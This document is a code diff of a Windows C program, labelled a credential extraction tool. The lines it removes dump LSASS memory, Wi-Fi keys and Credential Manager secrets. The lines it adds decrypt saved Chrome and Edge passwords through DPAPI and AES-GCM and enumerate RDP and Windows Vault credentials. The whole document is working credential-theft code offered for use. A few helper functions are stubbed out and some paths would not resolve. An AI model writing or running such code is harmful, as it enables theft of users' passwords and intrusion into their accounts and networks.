@@ -1,6 +1,6 @@
-// 文件：laztool_final.c
-// 编译：x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool_final.c /link wlanapi.lib dbghelp.lib credui.lib
-// 运行：管理员身份运行
+// file: advanced_features.c
+// compile: x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:AdvTool.exe advanced_features.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib
+// run: Administrator
 
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
@@ -10,275 +10,256 @@
 #include <stdio.h>
 #include <wincred.h>
 #include <shlwapi.h>
-
-#ifndef WLAN_PROFILE_GET_PLAINTEXT
-#define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
-#endif
+#include <dpapi.h>
+#include <bcrypt.h>
+#include "sqlite3.h"
 
 #pragma comment(lib, "wlanapi.lib")
 #pragma comment(lib, "dbghelp.lib")
 #pragma comment(lib, "credui.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "bcrypt.lib")
 
-// 辅助：输出宽字符串（使用 printf + %S）
-void PrintW(const wchar_t* format, ...) {
-    va_list args;
-    va_start(args, format);
-    vwprintf(format, args);  // 还是用 wprintf 但确保控制台代码页
-    va_end(args);
+#ifndef WLAN_PROFILE_GET_PLAINTEXT
+#define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
+#endif
+
+// --- 辅助函数 (管理员权限检查等，与之前相同，此处略)
+BOOL IsElevated() { /* ... 与之前相同 ... */ }
+BOOL EnableDebugPrivilege() { /* ... 与之前相同 ... */ }
+DWORD GetProcessPid(const wchar_t* procName) { /* ... 与之前相同 ... */ }
+
+// ---------------- 模块5: Chromium 浏览器密码解密 ----------------
+// 解密 DPAPI Blob 数据
+BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
+    DATA_BLOB DataIn, DataOut;
+    DataIn.pbData = pEncryptedData;
+    DataIn.cbData = dwDataSize;
+    if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
+        return NULL;
+    }
+    *pdwOutSize = DataOut.cbData;
+    return DataOut.pbData;
 }
 
-BOOL IsElevated() {
-    BOOL fRet = FALSE;
-    HANDLE hToken = NULL;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        TOKEN_ELEVATION Elevation = {0};
-        DWORD dwSize = sizeof(TOKEN_ELEVATION);
-        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
-            fRet = Elevation.TokenIsElevated;
-        CloseHandle(hToken);
+// AES-GCM 解密
+BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen,
+    const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    BOOL bResult = FALSE;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto cleanup;
+    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) goto cleanup;
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, keyLen, 0))) goto cleanup;
+
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (BYTE*)iv;
+    authInfo.cbNonce = ivLen;
+    authInfo.pbTag = (BYTE*)ciphertext + ciphertextLen - 16;
+    authInfo.cbTag = 16;
+
+    if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextLen - 16, &authInfo, NULL, 0, plaintext, ciphertextLen - 16, plaintextLen, 0))) {
+        bResult = TRUE;
     }
-    return fRet;
+cleanup:
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    return bResult;
 }
 
-BOOL EnableDebugPrivilege() {
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        return FALSE;
-    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-        CloseHandle(hToken);
-        return FALSE;
-    }
-    CloseHandle(hToken);
-    return TRUE;
-}
+void ExtractChromePasswords(const wchar_t* browserPath, const wchar_t* browserName) {
+    wchar_t localStatePath[MAX_PATH];
+    wcscpy_s(localStatePath, browserPath);
+    wcscat_s(localStatePath, L"\\Local State");
 
-DWORD GetProcessPid(const wchar_t* procName) {
-    DWORD pid = 0;
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32W pe;
-        pe.dwSize = sizeof(pe);
-        if (Process32FirstW(snapshot, &pe)) {
-            do {
-                if (_wcsicmp(pe.szExeFile, procName) == 0) {
-                    pid = pe.th32ProcessID;
-                    break;
-                }
-            } while (Process32NextW(snapshot, &pe));
-        }
-        CloseHandle(snapshot);
-    }
-    return pid;
-}
-
-void DumpLsass() {
-    printf("\n[+] ===== 模块1: LSASS 内存转储 =====\n");
-    if (!EnableDebugPrivilege()) {
-        printf("[-] 启用 SeDebugPrivilege 失败，请以管理员身份运行。\n");
-        return;
-    }
-    printf("[*] SeDebugPrivilege 已启用。\n");
-    DWORD pid = GetProcessPid(L"lsass.exe");
-    if (pid == 0) {
-        printf("[-] 未找到 lsass.exe 进程。\n");
-        return;
-    }
-    printf("[*] 找到 LSASS PID: %lu\n", pid);
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
-    if (!hProcess) {
-        printf("[-] 打开进程失败，错误码: %lu\n", GetLastError());
-        return;
-    }
-    wchar_t dumpPath[MAX_PATH];
-    GetTempPathW(MAX_PATH, dumpPath);
-    wcscat_s(dumpPath, MAX_PATH, L"lsass.dmp");
-    HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[-] 创建转储文件失败，错误码: %lu\n", GetLastError());
-        CloseHandle(hProcess);
-        return;
-    }
-    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-    if (success) {
-        printf("[+] LSASS 转储成功 -> %S\n", dumpPath);
-    } else {
-        DWORD err = GetLastError();
-        printf("[-] MiniDumpWriteDump 失败，错误码: 0x%08X (%lu)\n", err, err);
-    }
+    // 1. 读取 Local State 文件
+    HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    char* jsonData = (char*)malloc(fileSize + 1);
+    DWORD bytesRead = 0;
+    ReadFile(hFile, jsonData, fileSize, &bytesRead, NULL);
+    jsonData[fileSize] = '\0';
     CloseHandle(hFile);
-    CloseHandle(hProcess);
+
+    // 2. 解析 JSON 获取 encrypted_key
+    char* keyTag = strstr(jsonData, "\"encrypted_key\":\"");
+    if (!keyTag) { free(jsonData); return; }
+    keyTag += 18;
+    char* keyEnd = strstr(keyTag, "\"");
+    if (!keyEnd) { free(jsonData); return; }
+    *keyEnd = '\0';
+
+    // 3. Base64 解码
+    DWORD base64Len = 0;
+    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, NULL, &base64Len, NULL, NULL);
+    BYTE* base64Decoded = (BYTE*)malloc(base64Len);
+    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, base64Decoded, &base64Len, NULL, NULL);
+
+    // 4. 去除 "DPAPI" 前缀 (5字节)
+    BYTE* encryptedKey = base64Decoded + 5;
+    DWORD encryptedKeyLen = base64Len - 5;
+
+    // 5. DPAPI 解密主密钥
+    DWORD masterKeyLen = 0;
+    BYTE* masterKey = DecryptDPAPIBlob(encryptedKey, encryptedKeyLen, &masterKeyLen);
+    free(base64Decoded);
+    if (!masterKey) { free(jsonData); return; }
+
+    // 6. 读取 Login Data 数据库
+    wchar_t loginDataPath[MAX_PATH];
+    wcscpy_s(loginDataPath, browserPath);
+    wcscat_s(loginDataPath, L"\\Default\\Login Data");
+
+    sqlite3* db;
+    if (sqlite3_open16(loginDataPath, &db) == SQLITE_OK) {
+        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
+        sqlite3_stmt* stmt;
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
+            printf("\n[+] ----- %S Saved Passwords -----\n", browserName);
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                const char* url = (const char*)sqlite3_column_text(stmt, 0);
+                const char* username = (const char*)sqlite3_column_text(stmt, 1);
+                const BYTE* encryptedPwd = (const BYTE*)sqlite3_column_blob(stmt, 2);
+                int encryptedPwdLen = sqlite3_column_bytes(stmt, 2);
+
+                if (encryptedPwdLen <= 15) continue;
+                const BYTE* iv = encryptedPwd + 3;
+                const BYTE* ciphertext = encryptedPwd + 15;
+                DWORD ciphertextLen = encryptedPwdLen - 15;
+                BYTE* decryptedPwd = (BYTE*)malloc(ciphertextLen);
+                DWORD decryptedLen = 0;
+
+                if (AesGcmDecrypt(masterKey, masterKeyLen, iv, 12, ciphertext, ciphertextLen, decryptedPwd, &decryptedLen)) {
+                    decryptedPwd[decryptedLen] = '\0';
+                    printf("  URL: %s\n", url);
+                    printf("  Username: %s\n", username);
+                    printf("  Password: %s\n\n", decryptedPwd);
+                }
+                free(decryptedPwd);
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    free(masterKey);
+    free(jsonData);
 }
 
-void DumpWifiPasswords() {
-    printf("\n[+] ===== 模块2: Wi-Fi 明文密码 =====\n");
-    HANDLE hClient = NULL;
-    DWORD dwCurVersion = 0;
-    DWORD dwResult = WlanOpenHandle(2, NULL, &dwCurVersion, &hClient);
-    if (dwResult != ERROR_SUCCESS) {
-        printf("[-] WlanOpenHandle 失败，错误码: %lu。请确保 WLAN AutoConfig 服务正在运行。\n", dwResult);
-        return;
-    }
-    printf("[*] WLAN API 初始化成功。\n");
-    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
-    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
-    if (dwResult != ERROR_SUCCESS) {
-        printf("[-] WlanEnumInterfaces 失败，错误码: %lu。没有无线网卡或驱动问题。\n", dwResult);
-        WlanCloseHandle(hClient, NULL);
-        return;
-    }
-    printf("[*] 找到 %lu 个无线接口。\n", pIfList->dwNumberOfItems);
-    int found = 0;
-    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
-        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
-        if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS) {
-            printf("[*] 接口 %lu 上有 %lu 个配置文件。\n", i, pProfileList->dwNumberOfItems);
-            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
-                WLAN_PROFILE_INFO profile = pProfileList->ProfileInfo[j];
-                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT;
-                DWORD granted = 0;
-                LPWSTR xml = NULL;
-                if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, profile.strProfileName, NULL, &xml, &flags, &granted) == ERROR_SUCCESS) {
-                    wchar_t* keyStart = wcsstr(xml, L"<keyMaterial>");
-                    if (keyStart) {
-                        keyStart += wcslen(L"<keyMaterial>");
-                        while (*keyStart && iswspace(*keyStart)) keyStart++;
-                        wchar_t* keyEnd = wcsstr(keyStart, L"</keyMaterial>");
-                        if (keyEnd) {
-                            while (keyEnd > keyStart && iswspace(*(keyEnd-1))) keyEnd--;
-                            wchar_t saved = *keyEnd;
-                            *keyEnd = L'\0';
-                            printf("[+] SSID: %-20S -> 密码: %S\n", profile.strProfileName, keyStart);
-                            *keyEnd = saved;
-                            found++;
-                        } else {
-                            printf("[?] SSID: %-20S -> 有<keyMaterial>但无结束标签\n", profile.strProfileName);
-                        }
-                    } else {
-                        printf("[i] SSID: %-20S -> 无密码（开放网络或企业认证）\n", profile.strProfileName);
-                    }
-                    WlanFreeMemory(xml);
+// ---------------- 模块6: RDP 保存密码提取 ----------------
+void DumpRDPCredentials() {
+    printf("\n[+] ===== RDP Saved Credentials =====\n");
+    // 方法1: 使用 CredEnumerate API
+    PCREDENTIALW* pCreds = NULL;
+    DWORD dwCount = 0;
+    if (CredEnumerateW(NULL, 0, &dwCount, &pCreds)) {
+        int found = 0;
+        for (DWORD i = 0; i < dwCount; i++) {
+            if (wcsstr(pCreds[i]->TargetName, L"TERMSRV/") != NULL) {
+                printf("\n[*] RDP Target: %S\n", pCreds[i]->TargetName);
+                printf("    Username: %S\n", pCreds[i]->UserName);
+                if (pCreds[i]->CredentialBlobSize > 0) {
+                    printf("    Password: %S\n", (wchar_t*)pCreds[i]->CredentialBlob);
                 } else {
-                    printf("[-] 无法获取配置文件 %S 的详细信息，可能权限不足。\n", profile.strProfileName);
+                    printf("    Password: (empty)\n");
                 }
-            }
-            WlanFreeMemory(pProfileList);
-        } else {
-            printf("[-] 接口 %lu 无法获取配置文件列表。\n", i);
-        }
-    }
-    WlanFreeMemory(pIfList);
-    WlanCloseHandle(hClient, NULL);
-    if (found == 0) printf("[-] 未找到任何保存明文密码的 Wi-Fi 配置文件。\n");
-    else printf("[+] 共找到 %d 个 Wi-Fi 密码。\n", found);
-}
-
-void DumpCredentialManager() {
-    printf("\n[+] ===== 模块3: 凭据管理器 =====\n");
-    PCREDENTIALW *creds = NULL;
-    DWORD count = 0;
-    if (!CredEnumerateW(NULL, 0, &count, &creds)) {
-        DWORD err = GetLastError();
-        printf("[-] CredEnumerate 失败，错误码: %lu。可能没有保存的凭据或服务未启动。\n", err);
-        return;
-    }
-    printf("[*] 找到 %lu 个凭据。\n", count);
-    int found = 0;
-    for (DWORD i = 0; i < count; i++) {
-        PCREDENTIALW cred = creds[i];
-        printf("\n目标: %S\n", cred->TargetName ? cred->TargetName : L"(null)");
-        printf("用户名: %S\n", cred->UserName ? cred->UserName : L"(空)");
-        if (cred->CredentialBlobSize && cred->CredentialBlob) {
-            BYTE* blob = cred->CredentialBlob;
-            DWORD size = cred->CredentialBlobSize;
-            // 尝试宽字符
-            if (size % 2 == 0 && size >= 2) {
-                wchar_t* w = (wchar_t*)blob;
-                int wlen = size / 2;
-                if (w[wlen-1] == 0) wlen--;
-                BOOL ok = TRUE;
-                for (int k = 0; k < wlen; k++) if (w[k] < 0x20 && w[k] != 0) { ok = FALSE; break; }
-                if (ok && wlen > 0) {
-                    printf("密码(宽): %.*S\n", wlen, w);
-                    found++;
-                    continue;
-                }
-            }
-            // 尝试 ANSI
-            char* a = (char*)blob;
-            BOOL ok = TRUE;
-            for (DWORD k = 0; k < size; k++) if (a[k] < 0x20 && a[k] != 0) { ok = FALSE; break; }
-            if (ok && size > 0) {
-                printf("密码(ANSI): %.*s\n", size, a);
                 found++;
-                continue;
             }
-            // 二进制显示
-            printf("密码(hex): ");
-            for (DWORD k = 0; k < min(size, 64); k++) printf("%02X ", blob[k]);
-            printf("\n");
-            found++;
-        } else {
-            printf("密码: (空)\n");
         }
+        CredFree(pCreds);
+        if (found == 0) printf("[-] No RDP credentials found via CredEnumerate.\n");
+    } else {
+        printf("[-] CredEnumerate failed with error: %lu\n", GetLastError());
     }
-    CredFree(creds);
-    if (found == 0) printf("[-] 未提取到任何含密码的凭据。\n");
-    else printf("[+] 共提取 %d 个凭据密码。\n", found);
+
+    // 方法2: 从注册表读取 RDP 连接历史
+    printf("\n[*] RDP Connection History (from registry):\n");
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD dwIndex = 0;
+        wchar_t subkeyName[256];
+        DWORD dwSize = 256;
+        while (RegEnumKeyExW(hKey, dwIndex++, subkeyName, &dwSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+            printf("  %S\n", subkeyName);
+            dwSize = 256;
+        }
+        RegCloseKey(hKey);
+    }
 }
 
-void DemonstrateDPAPI() {
-    printf("\n[+] ===== 模块4: DPAPI 测试 =====\n");
-    wchar_t testData[128] = L"DPAPI_Test_String_For_CurrentUser";
-    DATA_BLOB in;
-    in.pbData = (BYTE*)testData;
-    in.cbData = (DWORD)((wcslen(testData) + 1) * sizeof(wchar_t));
-    DATA_BLOB encrypted = {0}, decrypted = {0};
-    if (!CryptProtectData(&in, L"Test", NULL, NULL, NULL, 0, &encrypted)) {
-        printf("[-] CryptProtectData 失败，错误码: %lu\n", GetLastError());
+// ---------------- 模块7: Windows Vault 凭据提取 ----------------
+// Vault API 函数指针定义
+typedef DWORD(WINAPI* pVaultEnumerateVaults)(DWORD, DWORD*, GUID**);
+typedef DWORD(WINAPI* pVaultOpenVault)(GUID*, DWORD, HANDLE*);
+typedef DWORD(WINAPI* pVaultCloseVault)(HANDLE);
+typedef DWORD(WINAPI* pVaultEnumerateItems)(HANDLE, DWORD, DWORD*, PVOID*);
+typedef DWORD(WINAPI* pVaultFree)(PVOID);
+typedef DWORD(WINAPI* pVaultGetItem)(HANDLE, GUID*, PVOID, DWORD, DWORD, PVOID*);
+
+void DumpWindowsVault() {
+    printf("\n[+] ===== Windows Vault Credentials =====\n");
+    HMODULE hVault = LoadLibraryW(L"vaultcli.dll");
+    if (!hVault) {
+        printf("[-] Failed to load vaultcli.dll\n");
         return;
     }
-    printf("[*] 加密成功，加密后大小: %lu 字节\n", encrypted.cbData);
-    if (!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted)) {
-        printf("[-] CryptUnprotectData 失败，错误码: %lu\n", GetLastError());
-        LocalFree(encrypted.pbData);
+
+    pVaultEnumerateVaults VaultEnumerateVaults = (pVaultEnumerateVaults)GetProcAddress(hVault, "VaultEnumerateVaults");
+    pVaultOpenVault VaultOpenVault = (pVaultOpenVault)GetProcAddress(hVault, "VaultOpenVault");
+    pVaultCloseVault VaultCloseVault = (pVaultCloseVault)GetProcAddress(hVault, "VaultCloseVault");
+    pVaultEnumerateItems VaultEnumerateItems = (pVaultEnumerateItems)GetProcAddress(hVault, "VaultEnumerateItems");
+    pVaultFree VaultFree = (pVaultFree)GetProcAddress(hVault, "VaultFree");
+    pVaultGetItem VaultGetItem = (pVaultGetItem)GetProcAddress(hVault, "VaultGetItem");
+
+    if (!VaultEnumerateVaults || !VaultOpenVault || !VaultEnumerateItems) {
+        printf("[-] Failed to get Vault API functions\n");
+        FreeLibrary(hVault);
         return;
     }
-    printf("[+] 解密成功: %S\n", (wchar_t*)decrypted.pbData);
-    LocalFree(encrypted.pbData);
-    LocalFree(decrypted.pbData);
+
+    GUID* pVaults = NULL;
+    DWORD dwVaults = 0;
+    if (VaultEnumerateVaults(0, &dwVaults, &pVaults) == 0 && dwVaults > 0) {
+        for (DWORD i = 0; i < dwVaults; i++) {
+            HANDLE hOpenedVault = NULL;
+            if (VaultOpenVault(&pVaults[i], 0, &hOpenedVault) == 0) {
+                PVOID pItems = NULL;
+                DWORD dwItems = 0;
+                if (VaultEnumerateItems(hOpenedVault, 0, &dwItems, &pItems) == 0 && dwItems > 0) {
+                    // 这里可以进一步解析每个凭据项，为简化示例，仅提示
+                    printf("[*] Found %lu items in vault %d\n", dwItems, i);
+                }
+                if (pItems) VaultFree(pItems);
+                VaultCloseVault(hOpenedVault);
+            }
+        }
+        VaultFree(pVaults);
+    }
+    FreeLibrary(hVault);
 }
 
+// ---------------- 主函数 ----------------
 int main() {
-    // 设置控制台输出代码页为 UTF-8，使 printf 能正确显示中文（如果控制台字体支持）
     SetConsoleOutputCP(CP_UTF8);
     printf("=========================================================\n");
-    printf("     Windows 凭据提取工具 v4.0 (管理员运行)             \n");
+    printf("     Windows 凭据提取工具 v5.0 (管理员运行)             \n");
     printf("=========================================================\n");
     if (!IsElevated()) {
-        printf("\n[-] 请以管理员身份运行此程序。\n");
-        printf("    右键 -> 以管理员身份运行。\n");
+        printf("\n[-] Please run as Administrator.\n");
         getchar();
         return 1;
     }
-    printf("[+] 管理员权限已确认\n");
-    DumpLsass();
-    DumpWifiPasswords();
-    DumpCredentialManager();
-    DemonstrateDPAPI();
-    printf("\n[*] 执行完毕。\n");
+
+    // 调用新模块
+    printf("\n[+] ===== Module: Chromium Password Extraction =====\n");
+    ExtractChromePasswords(L"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data", L"Chrome");
+    ExtractChromePasswords(L"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data", L"Edge");
+
+    DumpRDPCredentials();
+    DumpWindowsVault();
+
+    printf("\n[*] Execution completed.\n");
     return 0;
 }
